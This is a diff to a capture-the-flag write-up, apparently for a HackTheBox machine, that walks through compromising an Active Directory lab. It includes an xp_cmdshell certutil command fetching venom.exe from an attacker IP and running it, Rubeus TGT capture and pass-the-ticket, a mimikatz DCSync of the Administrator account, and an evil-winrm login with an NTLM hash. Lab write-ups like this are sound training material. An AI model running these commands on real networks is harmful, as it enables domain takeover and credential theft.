@@ -76,7 +76,7 @@ EXEC ('xp_cmdshell "certutil.exe -urlcache -f http://10.10.14.40/venom.exe C:\us
 
 --> Run it :
 
-EXEC ('xp_cmdshell "C:\users\svc_sql\Desktop\venom.exe"') AT [DC02.darkzero.ext];\
+EXEC ('xp_cmdshell "C:\users\svc_sql\Desktop\venom.exe"') AT [DC02.darkzero.ext];
 ```
 
 Now, We at DC02 we need to escalate our privileges !!
@@ -138,12 +138,10 @@ dnshostname        : DC02.darkzero.ext
 useraccountcontrol : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 ```
 
-
-
 We use Rubeus to listen to the LSASS memory with system privileges, and access the SMB share of DC02 from MSSQL Service 
 
 ```Dc02
-Rubeus.exe monitor /interval:5
+Rubeus.exe monitor /interval:5 /nowrap
 ```
 
 
@@ -153,3 +151,24 @@ xp_dirtree \\DC02.darkzero.ext\ggg
 ```
 
 Then get the TGT of DC01$@Darkzero.htb ; 
+
+![](delegate-tgt.png)
+
+
+Then pass the ticket ! 
+
+```
+Rubeus.exe renew /ticket:<tgt> /ptt /nowrap
+```
+
+As, we got the ticket cached on this DC , we can export the ticket and dc_sync via impacket-secretsdump or even mimikatz in this instance !
+
+```
+mimikatz # lsadump::dcsync /domain:darkzero.htb /user:darkzero\Administrator
+```
+
+```winrm
+evil-winrm -i darkzero.htb -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
+```
+
+![](root-darkzero.png)
